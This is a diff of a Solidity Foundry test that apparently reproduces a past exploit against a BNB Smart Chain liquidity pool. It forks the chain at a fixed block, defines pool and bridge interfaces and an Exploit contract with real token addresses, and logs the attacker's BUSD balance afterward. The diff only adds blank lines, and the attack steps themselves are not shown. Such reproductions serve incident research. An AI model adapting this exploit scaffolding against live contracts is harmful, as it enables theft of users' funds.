@@ -10,6 +10,7 @@ import "./../interface.sol";
 // https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210
 
 interface IPool {
+
     function swap(
         address fromToken,
         address toToken,
@@ -20,18 +21,24 @@ interface IPool {
     ) external returns (uint256 actualToAmount, uint256 haircut);
 
     function deposit(uint256 amount) external;
+
 }
 
 interface IPool2 {
+
     function deposit(uint256 amount) external;
     function withdraw(uint256 amountLp) external;
+
 }
 
 interface IBridge {
+
     function swap(uint256 amount, bytes32 token, bytes32 receiveToken, address recipient) external;
+
 }
 
 contract ContractTest is Test {
+
     function setUp() external {
         vm.createSelectFork("bsc", 26_982_067);
     }
@@ -40,9 +47,11 @@ contract ContractTest is Test {
         Exploit exploit = new Exploit();
         exploit.run();
     }
+
 }
 
 contract Exploit {
+
     IPancakePair pancakeSwap = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
     IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -118,4 +127,5 @@ contract Exploit {
 
         console.log("hacker BUSD bal after attack is        ", BUSD.balanceOf(tx.origin));
     }
+
 }
